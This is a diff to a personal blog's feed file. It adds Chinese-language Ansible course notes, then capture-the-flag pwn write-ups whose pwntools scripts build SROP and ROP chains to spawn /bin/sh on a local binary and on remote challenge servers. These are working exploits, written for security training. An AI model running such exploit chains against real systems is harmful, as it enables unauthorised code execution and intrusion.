+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$mkdir</span> group_vars </span><br><span class="line"><span class="variable">$mkdir</span> host_vars</span><br><span class="line"><span class="variable">$cd</span> group_vars</span><br><span class="line"><span class="variable">$vim</span> bind_server</span><br><span class="line"><span class="variable">$cd</span> ..</span><br><span class="line"><span class="variable">$cd</span> host_vars</span><br><span class="line"><span class="variable">$vim</span> servera.lab.example.com</span><br><span class="line"><span class="variable">$vim</span> serverb.lab.example.com</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$vim bind_server</code></li>
+</ul>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">install_software = bind-chroot</span><br><span class="line">service_name = named-chroot</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$vim servera.lab.example.com</code></li>
+</ul>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">ipv4_addr = 172.25.250.11</span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><code>$vim serverb.lab.example.com</code></li>
+</ul>
+<div class="highlight-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="code"><pre><span class="line">ipv4_addr = 172.25.250.12</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>$tree</code></li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HkTGL0wmT.png"
+                      alt="image.png"
+                ></p>
+<h4 id="Register"><a href="#Register" class="headerlink" title="Register"></a>Register</h4><ul>
+<li><p>register 語法可以取得命令輸出，並保存在一個臨時變數中</p>
+</li>
+<li><p><code>$vim newuser.yml</code></p>
+<div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Addusers</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">add</span> <span class="string">different</span> <span class="string">user</span> <span class="string">in</span> <span class="string">different</span> <span class="string">server</span></span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;newuser_name&#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">register:</span> <span class="string">useradd_result</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Print</span> <span class="string">results</span></span><br><span class="line">      <span class="attr">ansible.builtin.debugg:</span></span><br><span class="line">        <span class="attr">var:</span> <span class="string">useradd_result</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><code>$ansible-navigator run newuser.yml -m stdout</code></p>
+</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/S1Eos0wXT.png"
+                      alt="image.png"
+                ></p>
+<h4 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h4><h3 id="Task-control"><a href="#Task-control" class="headerlink" title="Task control"></a>Task control</h3><ul>
+<li><code>$vim user_add.yml</code><div class="highlight-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">User</span> <span class="string">Management</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">serverd.lab.example.com</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">user_lists:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">hcyang</span> </span><br><span class="line">        <span class="attr">user_id:</span> <span class="number">1236</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">jjli</span> </span><br><span class="line">        <span class="attr">user_id:</span> <span class="number">1235</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">adduser</span> &#123;&#123; <span class="string">item.name</span> &#125;&#125; </span><br><span class="line">      <span class="attr">ansible.builtin.user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.name &#125;&#125;</span>&quot;</span> </span><br><span class="line">        <span class="attr">uid:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.user_id &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; user_lists &#125;&#125;</span>&quot;</span> </span><br><span class="line">      <span class="attr">register:</span> <span class="string">useradd_result</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">print</span> <span class="string">results</span> </span><br><span class="line">      <span class="attr">ansible.builtin.debug:</span></span><br><span class="line">        <span class="attr">msg:</span> <span class="string">|</span></span><br><span class="line"><span class="string">        An user is add with name &#123;&#123; item.name &#125;&#125; </span></span><br><span class="line"><span class="string"></span>      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; useradd_result. results &#125;&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<h2 id="期末考整理"><a href="#期末考整理" class="headerlink" title="期末考整理"></a>期末考整理</h2><p><code>DNS Http varnish database</code></p>
+<p><a class="link"   href="https://www.youtube.com/watch?v=VhXenrYuYcE" >DNS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://www.youtube.com/watch?v=0em4LrNN_v8" >HTTP_server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://www.youtube.com/watch?v=q14Aunuv9WU" >Https cerify ~1:10:00 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   href="https://www.youtube.com/watch?v=q14Aunuv9WU" >Varnish and haproxy 1:10:00 ~  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a href="">Database</a></p>
+]]></content>
+      <categories>
+        <category>csie</category>
+      </categories>
+      <tags>
+        <tag>csie</tag>
+        <tag>server</tag>
       </tags>
   </entry>
   <entry>
@@ -2037,6 +2047,24 @@
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;./srop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 輸入會填進rsi</span></span><br><span class="line"></span><br><span class="line">p = flat(<span class="number">0x401000</span>,<span class="number">0x401003</span>,<span class="number">0x401000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.sendline(p)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;\x03&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.recv(<span class="number">0x240</span>)</span><br><span class="line"></span><br><span class="line">rsp = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x281</span></span><br><span class="line">success(<span class="string">&quot;rsp -&gt; %s&quot;</span>, <span class="built_in">hex</span>(rsp)) </span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">p2 = flat(</span><br><span class="line">    <span class="number">0x401000</span>,<span class="number">0x40100e</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">13</span>,</span><br><span class="line">    rsp+<span class="number">272</span>, <span class="comment"># rdi -&gt; &#x27;/bin/sh&#x27;</span></span><br><span class="line">    [<span class="number">0</span>]*<span class="number">4</span>,  <span class="comment"># rsi,rbp,rbx,rdx</span></span><br><span class="line">    <span class="number">0x3b</span>,   <span class="comment"># rax</span></span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0x40100e</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x33</span>,</span><br><span class="line">    [<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(p2))</span><br><span class="line">p2 += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.send(p2)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">r.send(p2[<span class="number">8</span>:][:<span class="number">15</span>])</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 
 <h3 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h3><p><a class="link"   href="https://kazma.tw/2024/08/05/LYS-Rop-lab-srop-Writeup/" >kazma.tw LYS-Rop-lab-srop-Writeup <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://oalieno.tw/2019/09/18/srop/" >oalieno.tw srop <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ROP WriteUp</title>
+    <url>/2024/08/09/pwn-4/</url>
+    <content><![CDATA[<h3 id="Ais3-lys-rop1"><a href="#Ais3-lys-rop1" class="headerlink" title="Ais3-lys-rop1"></a>Ais3-lys-rop1</h3><blockquote>
+<p>當有NX保護機制時，ROP可以幫助我們繞過他</p>
+</blockquote>
+<p>找gadget把rop chain推成shellcode的形狀</p>
+<br>
+
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = remote(<span class="string">&quot;35.229.243.81&quot;</span> ,<span class="number">10101</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;rop1&quot;)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;name?&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401f4f</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x0000000000485bab</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000044fd87</span></span><br><span class="line">pop_rax = <span class="number">0x000000000044fd87</span></span><br><span class="line">syscall  =<span class="number">0x0000000000401d04</span></span><br><span class="line">a_buf = <span class="number">0x4c7300</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line"><span class="comment"># p+= p64(pop_rax)+p64(59)</span></span><br><span class="line"><span class="comment"># p+= p64(pop_rsi)+p64(0x0)</span></span><br><span class="line"><span class="comment"># p+= p64(pop_rdi) + p64(a_buf)</span></span><br><span class="line"><span class="comment"># p += p64(pop_rdx_rbx)+p64(0x0)+p64(0x0)</span></span><br><span class="line"><span class="comment"># p += p64(syscall)</span></span><br><span class="line"></span><br><span class="line">p +=flat(</span><br><span class="line">    p64(pop_rax), p64(<span class="number">59</span>),</span><br><span class="line">    p64(pop_rsi) , p64(<span class="number">0x0</span>),</span><br><span class="line">    p64(pop_rdi) , p64(a_buf),</span><br><span class="line">    p64(pop_rdx_rbx),p64(<span class="number">0x0</span>)+p64(<span class="number">0x0</span>),</span><br><span class="line">    p64(syscall)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;vuln:&quot;</span>,p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="ncku-ctf-ezrop"><a href="#ncku-ctf-ezrop" class="headerlink" title="ncku-ctf-ezrop"></a>ncku-ctf-ezrop</h2><p>這題跟上面差在需要找到一個位置寫入<code>/bin/sh</code>在把rdi指過去，像上面我們把rdi指向name的memory address。<br>這邊我們利用 <code>mov qword ptr [rdi], rdx ; ret</code> 把rdx設為<code>/bin/sh</code>後丟到rdi指向的位置。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./rop&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.nckuctf.org&quot;</span>,<span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401e9f</span></span><br><span class="line">pop_rax = <span class="number">0x44fd07</span></span><br><span class="line">pop_rsi = <span class="number">0x409f0e</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x485a8b</span> </span><br><span class="line">syscall = <span class="number">0x401c54</span></span><br><span class="line">bss = <span class="number">0x4c5000</span></span><br><span class="line"></span><br><span class="line">mov_rdi_rdx = <span class="number">0x433463</span> <span class="comment">#  mov qword ptr [rdi], rdx ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    bss,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="number">0x0</span>,</span><br><span class="line">    mov_rdi_rdx,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;/home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 ]]></content>
       <tags>
         <tag>pwn</tag>
